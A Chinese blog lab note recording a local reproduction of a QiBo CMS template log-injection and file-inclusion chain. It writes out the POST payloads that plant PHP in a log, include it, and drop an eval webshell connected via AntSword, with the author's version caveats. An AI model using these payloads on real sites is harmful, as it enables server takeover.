ailx10说：这篇是我2024年8月写的。这篇骑士 CMS，我先让模板接口把一段内容写进当天日志，再把模板路径指向日志，观察它被包含时会怎样解释。phpinfo 出来之后，又继续试文件写入和工具连接，才把两段能力接成完整过程。最有意思的是日志原本只是记录，换个处理入口却变成了代码来源。笔记也留着标题版本和实际环境的差别，不能因为名称相近就当作都验证过。日期、路径、写权限和包含方式都连在一起，这次才不只是一个孤立的“模板注入”名字。

---

骑士CMS模板接口先使PHP文本写入当天日志，再把tpl设为日志路径包含，phpinfo成功后写shell.php并连接。

核查提示：本地用6.0.4复现，标题6.0.48不是实测环境；/r/n字面与换行需核，链依赖日志路径、可包含及写权限，未验证全版本。 原实验和代码未重新运行，图内细节有待核验。

本文记录骑士 CMS 模板与文件包含的历史本地实验。标题提到 6.0.48，实际测试环境为 6.0.4，不能据此断言所有更低版本均受影响。

（1）访问URL，后面一直都是这个URL

```
http://192.168.220.173/index.php?m=home&a=assign_resume_tpl
```

![](/notes-assets/b10464ee5439f3a85e2f.webp)

（2）在网站后台观察日志

![](/notes-assets/52315b4496315901d35c.webp)

（3）换成POST请求，将POC载荷打入日志文件

```
variable=1&tpl=<?php phpinfo(); ob_flush();?>/r/n<qscms/company_show 列表名="info" 企业id="$_GET['id']"/>
```

![](/notes-assets/ffa5c301c158e55076bd.webp)

（4）再次观察日志，POC载荷已经在日志中了

![](/notes-assets/51bb0a30580daa1d4798.webp)

（5）再次POST请求，本地文件（当天的日志文件）包含

```
variable=1&tpl=data/Runtime/Logs/Home/24_08_10.log
```

![](/notes-assets/2789f69f53123e89ab12.webp)

（6）附加：getshell的POC载荷

```
variable=1&tpl=<?php fputs(fopen("shell.php","w"),"<?php eval(\$_POST[x]);?>")?>; ob_flush();?>/r/n<qscms/company_show 列表名="info" 企业id="$_GET['id']"/>
```

![](/notes-assets/cdba9f3440125c81caf2.webp)

（7）在本实验的日志路径、包含行为及文件权限条件下，观察到输出文件。

```
variable=1&tpl=data/Runtime/Logs/Home/24_08_10.log
```

![](/notes-assets/07100212bffb18e2df65.webp)

（8）网站根目录下释放`shell.php`文件，直接getshell

- POST请求验证：OK

![](/notes-assets/a8e1388d392b14dbf53c.webp)

- 中国蚁剑连接：OK

链条里每个条件都重要，少了日志路径、包含能力或权限，结果都会变。标题中的版本和实际搭建版本也应同时留下，免得后来的人把一次实验当成全部版本的共同表现。
